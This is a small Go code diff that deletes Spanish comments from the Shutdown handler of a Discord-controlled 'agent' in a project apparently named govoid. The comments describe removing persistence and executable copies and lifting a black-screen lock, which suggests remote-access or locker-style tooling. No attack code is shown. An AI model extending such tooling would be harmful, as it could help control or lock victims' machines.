@@ -10,11 +10,7 @@ import (
 	"github.com/local/govoid/internal/util"
 )
 
-// Shutdown apaga el agente y limpia todo: persistencia, copias del exe y
-// contexto raíz. No reaparece aunque la máquina se reinicie.
 func Shutdown(s *discordgo.Session, i *discordgo.InteractionCreate) {
-	// Primero se levanta el candado: si el agente se va con la pantalla negra,
-	// la máquina queda inservible hasta reiniciar.
 	EnsureUnlocked()
 
 	_ = Reply(s, i, "🔌 Apagando agente y limpiando persistencia…")
